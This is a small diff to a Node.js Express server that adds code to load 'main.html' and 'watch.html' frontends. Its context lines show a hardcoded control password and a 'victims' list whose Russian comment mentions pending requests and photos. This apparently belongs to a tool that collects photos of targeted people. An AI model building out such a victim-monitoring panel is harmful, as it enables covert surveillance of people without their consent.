@@ -1,8 +1,12 @@
 const express = require('express')
 const app = express()
 const PORT  = process.env.PORT || 3000
+const fs = require('fs')
 
 const controlPassword = process.env.password || 'gAZan6742'
+
+const mainFrontend = fs.readFileSync('./main.html', 'utf8')
+const watchFrontend = fs.readFileSync('./watch.html', 'utf8')
 
 let victims = []
 //айди, пендинг реквестс, фотка, номер фотки
